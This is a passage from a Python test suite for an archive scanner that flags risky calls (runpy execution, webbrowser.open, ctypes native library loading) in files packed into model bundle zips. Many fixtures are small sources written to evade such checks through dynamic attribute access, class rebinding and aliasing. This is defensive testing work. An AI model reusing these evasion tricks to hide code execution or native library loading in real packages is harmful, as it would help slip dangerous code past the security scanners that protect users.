        "ctypes.LibraryLoader(ClassBodyInitCDLL).classbodyinitlib\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert set(checks_by_rule) == {"S109", "S110"}
    assert checks_by_rule["S109"].severity == IssueSeverity.CRITICAL
    assert checks_by_rule["S109"].details["reason"] == "high-risk calls: webbrowser.open"
    assert checks_by_rule["S110"].severity == IssueSeverity.CRITICAL
    assert "ctypes.cdll.msvcrt" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.windll.kernel32" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.msvcrt" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.payload" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.aliaslib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.methodlib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.getitemlib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.keywordlib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.keywordgetitem" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.<dynamic>" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.subclasslib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.cdll.unboundlib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.cdll.unboundgetitem" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.cdll.selfkeywordlib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.cdll.selfkeywordgetitem" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.cdll.objectmethodlib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.cdll.objectgetitem" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.cdll.objectgetattr" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.windll.kernel32" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.conditionalmethod" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.cdll.augmented" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.augmented" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.classaliaslib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.attrlib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.cdll.<dynamic>" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.cdll.keywordgetattr" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.unpacklib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.unpackkwlib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.emptystarlib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.localizedgetattr" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.<dynamic>" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.localizedkeywordgetattr" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.windll.user32" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.windll.advapi32" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.cdll.hasattrlib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.hasattrpayload" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.localaliaslib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.starredlib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.superskiplib" in checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.classbodyinitlib" in checks_by_rule["S110"].details["reason"]


def test_scan_zip_flags_unbound_libraryloader_accessor_dispatch(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "type(loader).__getattr__(loader, 'typegetattr')\n"
        "loader.__class__.__getitem__(loader, 'classgetitem')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert set(checks_by_rule) == {"S110"}
    s110_reason = checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.typegetattr" in s110_reason
    assert "ctypes.LibraryLoader.classgetitem" in s110_reason


def test_scan_zip_flags_webbrowser_controller_getattribute_launch(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import webbrowser\nwebbrowser.get().__getattribute__('open')('https://example.invalid')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S109"
    assert python_checks[0].details["reason"] == "high-risk calls: webbrowser.open"


def test_scan_zip_handles_final_dynamic_accessor_edges(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "import webbrowser\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader.payload = len\n"
        "delattr(loader, 'payload')\n"
        "loader.payload\n"
        "browser = webbrowser.get()\n"
        "browser.open = len\n"
        "delattr(browser, 'open')\n"
        "browser.open('https://example.invalid')\n"
        "getattr(*(ctypes.cdll, 'msvcrt'))\n"
        "hasattr(*(ctypes.LibraryLoader(ctypes.CDLL), 'hasattrpayload'))\n"
        "getattr(ctypes.cdll, 'emptykwargs', **{})\n"
        "hasattr(ctypes.LibraryLoader(ctypes.CDLL), 'hasattremptykwargs', **{})\n"
        "ctypes.LibraryLoader.__getattr__(ctypes.cdll, 'unboundgetattr')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert set(checks_by_rule) == {"S109", "S110"}
    assert checks_by_rule["S109"].details["reason"] == "high-risk calls: webbrowser.open"
    s110_reason = checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.payload" in s110_reason
    assert "ctypes.cdll.msvcrt" in s110_reason
    assert "ctypes.cdll.emptykwargs" in s110_reason
    assert "ctypes.LibraryLoader.hasattrpayload" in s110_reason
    assert "ctypes.LibraryLoader.hasattremptykwargs" in s110_reason
    assert "ctypes.cdll.unboundgetattr" in s110_reason


def test_scan_zip_flags_class_rebound_inert_libraryloader(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "loader = ctypes.LibraryLoader(len)\n"
        "loader.__class__._dlltype = ctypes.CDLL\n"
        "del loader._dlltype\n"
        "loader.payload\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S110"
    assert python_checks[0].details["reason"] == "high-risk calls: ctypes.LibraryLoader.payload"


def test_scan_zip_ignores_safe_class_rebound_inert_libraryloader(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "loader = ctypes.LibraryLoader(len)\n"
        "loader.__class__._dlltype = len\n"
        "del loader._dlltype\n"
        "loader.payload\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S110"
        for check in result.checks
    )


def test_scan_zip_ignores_shadowed_type_module_class_accessor(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import runpy\ntype = len\ntype(runpy).__getattribute__(runpy, 'run_path')('payload.py')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_scan_zip_honors_safe_dynamic_member_aliases_and_method_overwrites(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "import webbrowser\n"
        "browser = webbrowser.get()\n"
        "other_browser = browser\n"
        "browser.open = len\n"
        "browser = webbrowser.get()\n"
        "other_browser.open([])\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "other_loader = loader\n"
        "loader.payload = len\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "other_loader.payload\n"
        "method_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "method_loader.LoadLibrary = len\n"
        "method_loader.LoadLibrary([])\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_resolves_final_ctypes_initializer_edges(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "class Safe:\n"
        "    def __init__(self, name: str) -> None:\n"
        "        self.name = name\n"
        "class ClassBodyCDLL(Safe, ctypes.CDLL):\n"
        "    __init__ = ctypes.CDLL.__init__\n"
        "ctypes.LibraryLoader(ClassBodyCDLL).classbodylib\n"
        "class ClassQualifiedCDLL(ctypes.CDLL):\n"
        "    init = ctypes.CDLL.__init__\n"
        "    def __init__(self, name: str) -> None:\n"
        "        ClassQualifiedCDLL.init(self, name)\n"
        "ctypes.LibraryLoader(ClassQualifiedCDLL).qualifiedlib\n"
        "class SuperSkipCDLL(Safe, ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        super(Safe, self).__init__(name)\n"
        "ctypes.LibraryLoader(SuperSkipCDLL).superskiplib\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert set(checks_by_rule) == {"S110"}
    s110_reason = checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.classbodylib" in s110_reason
    assert "ctypes.LibraryLoader.qualifiedlib" in s110_reason
    assert "ctypes.LibraryLoader.superskiplib" in s110_reason


def test_scan_zip_ignores_invalid_ctypes_initializer_delegates(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "class MissingNameCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        super().__init__()\n"
        "ctypes.LibraryLoader(MissingNameCDLL).payload\n"
        "class DirectMissingNameCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        ctypes.CDLL.__init__(self)\n"
        "ctypes.LibraryLoader(DirectMissingNameCDLL).payload\n"
        "class WrongSelfCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        ctypes.CDLL.__init__(object(), name)\n"
        "ctypes.LibraryLoader(WrongSelfCDLL).payload\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S110"
        for check in result.checks
    )


def test_scan_zip_restores_dynamic_member_defaults_after_namespace_rebinds(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "import webbrowser\n"
        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader.payload = len\n"
        "globals()['loader'] = ctypes.LibraryLoader(ctypes.CDLL)\n"
        "loader.payload\n"
        "browser = webbrowser.get()\n"
        "browser.open = len\n"
        "globals().update(browser=webbrowser.get())\n"
        "browser.open('https://example.invalid')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert set(checks_by_rule) == {"S109", "S110"}
    assert checks_by_rule["S109"].details["reason"] == "high-risk calls: webbrowser.open"
    assert "ctypes.LibraryLoader.payload" in checks_by_rule["S110"].details["reason"]


def test_scan_zip_keeps_dynamic_member_deletes_child_scope_local(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "import webbrowser\n"
        "ctypes.windll.payload = len\n"
        "browser = webbrowser.get()\n"
        "browser.open = len\n"
        "def child():\n"
        "    del ctypes.windll.payload\n"
        "    del browser.open\n"
        "ctypes.windll.payload\n"
        "browser.open([])\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_flags_empty_kwargs_loader_constructor_and_current_super(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "ctypes.LibraryLoader(ctypes.CDLL, **{}).emptykwargs\n"
        "class Empty:\n"
        "    pass\n"
        "class EmptyLeadingCDLL(Empty, ctypes.CDLL):\n"
        "    pass\n"
        "ctypes.LibraryLoader(EmptyLeadingCDLL).emptyleadinglib\n"
        "class EmptyBaseSuperCDLL(Empty, ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        super().__init__(name)\n"
        "ctypes.LibraryLoader(EmptyBaseSuperCDLL).emptybasesuperlib\n"
        "class CurrentSuperCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        super(CurrentSuperCDLL, self).__init__(name)\n"
        "ctypes.LibraryLoader(CurrentSuperCDLL).currentsuperlib\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert set(checks_by_rule) == {"S110"}
    s110_reason = checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.emptykwargs" in s110_reason
    assert "ctypes.LibraryLoader.emptyleadinglib" in s110_reason
    assert "ctypes.LibraryLoader.emptybasesuperlib" in s110_reason
    assert "ctypes.LibraryLoader.currentsuperlib" in s110_reason


def test_scan_zip_resolves_initializer_delete_before_class_alias_fallback(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "class DeletedShadowCDLL(ctypes.CDLL):\n"
        "    init = ctypes.CDLL.__init__\n"
        "    def __init__(self, name: str) -> None:\n"
        "        self.init = len\n"
        "        del self.init\n"
        "        self.init(name)\n"
        "ctypes.LibraryLoader(DeletedShadowCDLL).deletedshadowlib\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert set(checks_by_rule) == {"S110"}
    assert "ctypes.LibraryLoader.deletedshadowlib" in checks_by_rule["S110"].details["reason"]


def test_scan_zip_resolves_imports_inside_ctypes_subclass_initializers(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "class ImportAliasCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        import ctypes as ct\n"
        "        ct.CDLL.__init__(self, name)\n"
        "ctypes.LibraryLoader(ImportAliasCDLL).importaliaslib\n"
        "class FromImportCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        from ctypes import CDLL\n"
        "        CDLL.__init__(self, name)\n"
        "ctypes.LibraryLoader(FromImportCDLL).fromimportlib\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert set(checks_by_rule) == {"S110"}
    s110_reason = checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.importaliaslib" in s110_reason
    assert "ctypes.LibraryLoader.fromimportlib" in s110_reason


def test_scan_zip_ignores_unreachable_new_returns_async_init_and_hasattr_alias(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "import os\n"
        "class ReachableInstanceCDLL(ctypes.CDLL):\n"
        "    def __new__(cls, name: str):\n"
        "        return super().__new__(cls)\n"
        "        return object()\n"
        "ctypes.LibraryLoader(ReachableInstanceCDLL).reachablelib\n"
        "class AsyncInitCDLL(ctypes.CDLL):\n"
        "    async def __init__(self, name: str) -> None:\n"
        "        ctypes.CDLL.__init__(self, name)\n"
        "ctypes.LibraryLoader(AsyncInitCDLL).payload\n"
        "class StaticInitCDLL(ctypes.CDLL):\n"
        "    @staticmethod\n"
        "    def __init__(self, name: str) -> None:\n"
        "        ctypes.CDLL.__init__(self, name)\n"
        "ctypes.LibraryLoader(StaticInitCDLL).payload\n"
        "class SafeBase:\n"
        "    def __init__(self, name: str) -> None:\n"
        "        self.name = name\n"
        "class SafeSuperCDLL(SafeBase, ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        super().__init__(name)\n"
        "ctypes.LibraryLoader(SafeSuperCDLL).payload\n"
        "class SafeCurrentSuperCDLL(SafeBase, ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        super(SafeCurrentSuperCDLL, self).__init__(name)\n"
        "ctypes.LibraryLoader(SafeCurrentSuperCDLL).payload\n"
        "class InvalidSuperSelfCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        super(InvalidSuperSelfCDLL, object()).__init__(name)\n"
        "ctypes.LibraryLoader(InvalidSuperSelfCDLL).payload\n"
        "class AsyncNewCDLL(ctypes.CDLL):\n"
        "    async def __new__(cls, name: str):\n"
        "        return super().__new__(cls)\n"
        "ctypes.LibraryLoader(AsyncNewCDLL).payload\n"
        "class NumericDeadDelegateCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        if 0:\n"
        "            ctypes.CDLL.__init__(self, name)\n"
        "ctypes.LibraryLoader(NumericDeadDelegateCDLL).payload\n"
        "class BadKwInitCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        ctypes.CDLL.__init__(self, **{'name': name, 'bad': 1})\n"
        "ctypes.LibraryLoader(BadKwInitCDLL).payload\n"
        "class BadDirectKwInitCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        ctypes.CDLL.__init__(self, name=name, bad=1)\n"
        "ctypes.LibraryLoader(BadDirectKwInitCDLL).payload\n"
        "class BadSurplusArgsCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        ctypes.CDLL.__init__(self, name, 0, None, False, False, None, 'extra')\n"
        "ctypes.LibraryLoader(BadSurplusArgsCDLL).payload\n"
        "class BadBoundSurplusArgsCDLL(ctypes.CDLL):\n"
        "    init = ctypes.CDLL.__init__\n"
        "    def __init__(self, name: str) -> None:\n"
        "        self.init(name, 0, None, False, False, None, 'extra')\n"
        "ctypes.LibraryLoader(BadBoundSurplusArgsCDLL).payload\n"
        "class ClassMethodInitCDLL(ctypes.CDLL):\n"
        "    @classmethod\n"
        "    def __init__(cls, name: str) -> None:\n"
        "        ctypes.CDLL.__init__(cls, name)\n"
        "ctypes.LibraryLoader(ClassMethodInitCDLL).payload\n"
        "AliasSafeBase = SafeBase\n"
        "class SafeAliasSuperCDLL(AliasSafeBase, ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        super().__init__(name)\n"
        "ctypes.LibraryLoader(SafeAliasSuperCDLL).payload\n"
        "class ReturnBeforeDelegateCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        return\n"
        "        ctypes.CDLL.__init__(self, name)\n"
        "ctypes.LibraryLoader(ReturnBeforeDelegateCDLL).payload\n"
        "class RaiseBeforeDelegateCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        raise RuntimeError(name)\n"
        "        ctypes.CDLL.__init__(self, name)\n"
        "ctypes.LibraryLoader(RaiseBeforeDelegateCDLL).payload\n"
        "class InstanceStoredAliasCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        self.init = ctypes.CDLL.__init__\n"
        "        self.init(name)\n"
        "ctypes.LibraryLoader(InstanceStoredAliasCDLL).payload\n"
        "ctypes.LibraryLoader(**{'dlltype': ctypes.CDLL, 'bad': 1}).payload\n"
        "getattr(ctypes.cdll, 123)\n"
        "hasattr(ctypes.cdll, 123)\n"
        "ctypes.LibraryLoader.__getattr__(ctypes.cdll, 123)\n"
        "f = hasattr(os, 'system')\n"
        "f('id')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert set(checks_by_rule) == {"S110"}
    assert checks_by_rule["S110"].details["reason"] == "high-risk calls: ctypes.LibraryLoader.reachablelib"


def test_scan_zip_resolves_static_ctypes_initializer_call_forms(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\n"
        "ctypes.LibraryLoader(**{'dlltype': len, 'dlltype': ctypes.CDLL}).duplicatekwlib\n"
        "class KwNameCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        ctypes.CDLL.__init__(self, **{'name': name})\n"
        "ctypes.LibraryLoader(KwNameCDLL).kwnameinitlib\n"
        "class StarArgsCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        ctypes.CDLL.__init__(*(self, name))\n"
        "ctypes.LibraryLoader(StarArgsCDLL).starargsinitlib\n"
        "class DelegatingBase:\n"
        "    def __init__(self, name: str) -> None:\n"
        "        super().__init__(name)\n"
        "class ForwardingBaseCDLL(DelegatingBase, ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        super().__init__(name)\n"
        "ctypes.LibraryLoader(ForwardingBaseCDLL).forwardingbaselib\n"
        "class BranchFallbackCDLL(ctypes.CDLL):\n"
        "    init = ctypes.CDLL.__init__\n"
        "    def __init__(self, name: str) -> None:\n"
        "        if name == 'skip':\n"
        "            self.init = len\n"
        "        self.init(name)\n"
        "ctypes.LibraryLoader(BranchFallbackCDLL).branchfallbacklib\n"
        "class RedefinedInitCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        pass\n"
        "    def __init__(self, name: str) -> None:\n"
        "        ctypes.CDLL.__init__(self, name)\n"
        "ctypes.LibraryLoader(RedefinedInitCDLL).redefinedinitlib\n"
        "class AssignedInitCDLL(ctypes.CDLL):\n"
        "    def __init__(self, name: str) -> None:\n"
        "        pass\n"
        "    __init__ = ctypes.CDLL.__init__\n"
        "ctypes.LibraryLoader(AssignedInitCDLL).assignedinitlib\n"
        "class PartialNewCDLL(ctypes.CDLL):\n"
        "    def __new__(cls, name: str):\n"
        "        if name == 'skip':\n"
        "            return object()\n"
        "        return super().__new__(cls)\n"
        "ctypes.LibraryLoader(PartialNewCDLL).partialnewlib\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    checks_by_rule = {check.rule_code: check for check in python_checks}
    assert set(checks_by_rule) == {"S110"}
    s110_reason = checks_by_rule["S110"].details["reason"]
    assert "ctypes.LibraryLoader.duplicatekwlib" in s110_reason
    assert "ctypes.LibraryLoader.kwnameinitlib" in s110_reason
    assert "ctypes.LibraryLoader.starargsinitlib" in s110_reason
    assert "ctypes.LibraryLoader.forwardingbaselib" in s110_reason
    assert "ctypes.LibraryLoader.branchfallbacklib" in s110_reason
    assert "ctypes.LibraryLoader.redefinedinitlib" in s110_reason
    assert "ctypes.LibraryLoader.assignedinitlib" in s110_reason
    assert "ctypes.LibraryLoader.partialnewlib" in s110_reason


def test_scan_zip_flags_extensionless_runpy_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler", "import runpy\nrunpy.run_module('payload')\n")

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S108"
    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_module"


def test_scan_zip_ignores_extensionless_runpy_near_match(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("notes", "documentation mentions runpy.run_module('payload')\n")

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_preserves_possible_runpy_execution_after_conditional_overwrite(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import runpy\nif replace:\n    runpy.run_path = len\nrunpy.run_path('payload.py')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S108"
    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_path"


def test_scan_zip_preserves_possible_runpy_execution_after_forwarded_conditional_overwrite(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import runpy as rp\nmod = rp\nif replace:\n    mod.run_path = len\nrp.run_path('payload.py')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S108"
    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_path"


@pytest.mark.parametrize(
    "safe_state",
    [
        "runner = rp.run_path if False else print\nrunner('safe')\n",
        "runner = print if 1 else rp.run_path\nrunner('safe')\n",
        "runner = rp.run_path and print\nrunner('safe')\n",
        "runner = True or rp.run_path\nrunner('safe')\n",
        "runner = print or rp.run_path\nrunner('safe')\n",
        "del rp.run_path\nrp.run_path('safe')\n",
        "getattr(object=rp, name='run_path')('safe')\n",
    ],
)
def test_scan_zip_ignores_proven_safe_runpy_late_state(tmp_path: Path, safe_state: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", "import runpy as rp\n" + safe_state)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("source", "rule_code"),
    [
        (
            "import builtins\nimport runpy as rp\nbuiltins.print = False\n"
            "runner = print or rp.run_path\nrunner('payload.py')\n",
            "S108",
        ),
        (
            "import builtins\nimport runpy as rp\nvars(builtins)['print'] = False\n"
            "runner = print or rp.run_path\nrunner('payload.py')\n",
            "S108",
        ),
        (
            "import builtins\nimport runpy as rp\nvars(builtins).update({'print': False})\n"
            "runner = print or rp.run_path\nrunner('payload.py')\n",
            "S108",
        ),
        (
            "import builtins\nimport webbrowser\nbuiltins.print = False\n"
            "opener = print or webbrowser.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            "import builtins\nimport webbrowser\nvars(builtins)['print'] = False\n"
            "opener = print or webbrowser.open\nopener('https://example.invalid')\n",
            "S109",
        ),
        (
            "import builtins\nimport webbrowser\nvars(builtins).update({'print': False})\n"
